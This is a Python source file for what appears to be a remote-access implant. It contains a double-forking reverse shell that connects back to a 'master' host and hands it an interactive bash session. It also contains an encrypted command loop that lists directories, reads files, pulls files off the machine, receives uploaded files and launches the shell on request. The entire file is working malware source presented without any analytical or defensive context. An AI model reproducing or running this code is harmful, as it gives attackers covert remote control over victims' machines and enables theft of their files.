from sys import exit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as socket_error
from os import dup2, fork, listdir, getcwd
from subprocess import run, Popen, DEVNULL
from time import sleep

from utils.crypto import encrypt, decrypt


def reverse_shell(master_hostname, shell_port):
    # fork twice, kill parents, redirect in, out and err fds and run bash interactive shell 
    pid = fork()
    if pid == 0:
        pid2 = fork()
        if pid2 == 0:
            sh_conn = socket(AF_INET, SOCK_STREAM)
            sh_conn.connect((master_hostname, shell_port)) 
            dup2(sh_conn.fileno(),0) 
            dup2(sh_conn.fileno(),1) 
            dup2(sh_conn.fileno(),2) 
            run(["/bin/bash","-i"])
            # reborn(master_hostname, master_port)
    exit(0)

def send_res(conn, res):
    # encrypted plain text response and send to master
    try:
        res = "ACK" + res
        crypt_res = encrypt(res)
        conn.send(crypt_res)
    except socket_error:
        print("error1")
        # error sending data to master
        exit(0)
    return conn


def recv_cmd(conn, buffer):
    # receive encrypted response from master and decrypt
    try:
        crypt_cmd = conn.recv(buffer)
        cmd = decrypt(crypt_cmd)
        return conn, cmd
    except socket_error:
        print("error2")
        # error connecting to master to recv data, reborn
        exit(0)


def cmd_shell(conn, master_hostname, master_port):
    # command shell interface
    while True:
        conn, cmd = recv_cmd(conn, 1024)
        res = ""

        if cmd[:2] == "ls":
            res = ""
            if len(cmd) > 2:
                path = cmd[3:]
            else:
                path = "."
            resp_list = listdir(path)
            for resp in resp_list:
                res += resp + "\n"
            conn = send_res(conn, res)

        elif cmd[:3] == "pwd":
            res = str(getcwd())
            conn = send_res(conn, res)

        elif cmd[:3] == "cat":
            data = ""
            try:
                with open(cmd[4:], "r") as fp:
                    data = fp.read()
                res += data
            except:
                res = "error opening file"

        elif cmd[:2] == "dl":
            filepath = cmd[3:]
            try:
                fp = open(filepath, "r")
            except:
                continue
            data = fp.read()
            fp.close()
            res = str(data)

        elif cmd[:2] == "pl":
            filename = "master_dl"
            conn, data = recv_cmd(conn, 64000)
            fp = open(filename, "w")
            fp.write(data)
            fp.close()

        elif cmd[:5] == "shell":
            shell_port = int(cmd[5:])
            sleep(1)
            reverse_shell(master_hostname, shell_port)
            
        else:
            res = "404could not find command"
            conn = send_res(conn, res)
                
